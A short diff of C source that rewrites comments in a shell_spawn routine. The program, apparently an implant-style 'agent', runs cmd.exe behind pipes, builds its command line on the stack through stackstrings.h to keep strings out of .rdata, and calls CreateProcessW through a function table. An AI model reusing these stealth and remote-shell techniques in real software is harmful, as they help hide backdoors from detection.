@@ -7,9 +7,9 @@
 #include "memory.h"
 #include "stackstrings.h"
 
-/* C1 step 2: no static pool. agent_main() owns the array on its frame
- * (its lifetime = the process) and passes it to every pool function.
- * Zero-init happens in agent_main's frame - slots start free. */
+/* The pool is owned by agent_main() - its frame lives as long as the
+ * process - and arrives here as a parameter. Slots start zeroed (the
+ * owner clears the array); in_use == 0 is what "free" means. */
 
 /* ---------------------------------------------------------------------------
  * shell_spawn - create cmd.exe behind two pipes and record it in *slot.
@@ -54,8 +54,8 @@ int shell_spawn(shell_slot *slot)
      * after the chcp command completes. The command line MUST be a
      * writable buffer: CreateProcessW is documented to modify it in place,
      * so a string literal (read-only .rdata) crashes inside the call. */
-    /* C1 step 3b: the command line is stack-built (no .rdata literal);
-     * still a WRITABLE frame buffer - CreateProcessW modifies it in place. */
+    /* Built on the stack (stackstrings.h); it MUST stay a writable frame
+     * buffer - CreateProcessW modifies the command line in place. */
     WCHAR cmdline[27];
     StrCmdline(cmdline);
     BOOL ok = kernel.CreateProcessW(NULL, cmdline,
